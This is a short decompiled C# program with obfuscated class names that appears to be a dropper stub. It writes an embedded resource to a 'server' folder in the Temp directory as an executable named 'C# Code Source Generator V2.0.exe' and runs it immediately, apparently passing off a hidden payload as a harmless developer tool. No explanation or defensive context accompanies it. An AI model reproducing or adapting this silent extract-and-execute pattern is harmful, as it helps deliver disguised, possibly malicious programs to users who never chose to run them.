using System;
using System.Diagnostics;
using System.IO;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using WindowsApplication1.My.Resources;

[StandardModule]
internal sealed class Class4
{
	[STAThread]
	public static void Main()
	{
		string text = ((ServerComputer)Class2.Class1_0).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\server\\";
		Directory.CreateDirectory(text);
		File.WriteAllBytes(text + "C# Code Source Generator V2.0.exe", Resources.Byte_0);
		Process.Start(text + "C# Code Source Generator V2.0.exe");
	}
}
